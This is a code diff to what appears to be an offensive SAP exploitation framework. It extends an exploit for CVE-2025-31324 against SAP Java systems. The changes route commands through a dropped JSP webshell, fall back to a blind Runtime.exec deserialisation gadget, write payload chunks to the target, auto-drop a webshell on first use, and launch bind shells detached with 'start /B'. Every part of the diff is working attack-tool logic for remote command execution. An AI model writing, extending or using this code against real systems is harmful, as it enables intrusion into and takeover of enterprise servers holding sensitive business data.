@@ -557,6 +557,18 @@ def _detect_is_windows(node, method: str = "sxpg") -> bool:
         if method == "gateway" and node.gw_vulnerable:
             r = sapmap_exploit.execute_gw_command(
                 node, "cmd.exe", f"/C echo {probe_token}")
+        elif method == "cve_31324" and node.cve_2025_31324_vulnerable:
+            # Route through the dropped JSP if available (output capture),
+            # otherwise fire the blind Runtime.exec gadget — in the latter
+            # case we can't read the echo back, so assume Windows (SAP Java
+            # deployments on Linux are rare and the caller can correct the
+            # OS type via "Set OS Type").
+            r = sapmap_exploit.execute_cve_2025_31324_via_shell(
+                node, f"cmd.exe /C echo {probe_token}")
+            if not (node.cve_2025_31324_shells):
+                # Blind exec — no output to match; assume Windows.
+                node.os_type = "Windows"
+                return True
         else:
             creds = node.best_credentials()
             if not creds:
@@ -2024,10 +2036,10 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     node, payload["command"], payload["params"],
                     long_params=payload.get("long_params"))
             elif method == "cve_31324":
-                # CVE-2025-31324: Java deserialisation gadget runs
-                # Runtime.exec(<cmd>).  Runtime.exec tokenises on spaces, so we
-                # rejoin (command, params) and let the dropped shell (if any)
-                # capture stdout for progress feedback.
+                # CVE-2025-31324: Runtime.exec(String) whitespace-tokenises and
+                # breaks `powershell -c "<complex script>"`.  Route through the
+                # JSP webshell so cmd.exe does the shell parsing.  via_shell()
+                # auto-drops a shell on first use if none exists.
                 pre_steps = payload.get("steps", [])
                 if pre_steps:
                     total = len(pre_steps)
@@ -2037,11 +2049,19 @@ def create_app(api: SAPMAPApi) -> Bottle:
                             return
                         _set_progress(
                             f"Writing payload chunk {idx+1}/{total}...")
-                        sapmap_exploit.execute_cve_2025_31324_command(
-                            node, step["command"], step["params"])
+                        full_cmd = (step["command"] + " " + step["params"]).strip()
+                        sapmap_exploit.execute_cve_2025_31324_via_shell(
+                            node, full_cmd)
                 _set_progress("Executing payload...")
-                result = sapmap_exploit.execute_cve_2025_31324_command(
-                    node, payload["command"], payload["params"])
+                full_cmd = (payload["command"] + " " + payload["params"]).strip()
+                # For bind shell: the execute step blocks until the socket is
+                # accepted.  The JSP shell would hold the HTTP connection open
+                # the whole time, preventing the caller from proceeding to
+                # start_connector.  Launch detached via `start /B`.
+                if shell_mode == "bind":
+                    full_cmd = f"cmd.exe /C start /B {full_cmd}"
+                result = sapmap_exploit.execute_cve_2025_31324_via_shell(
+                    node, full_cmd)
             else:
                 # SXPG: split EXTPROG + PARAMS
                 creds = node.best_credentials()
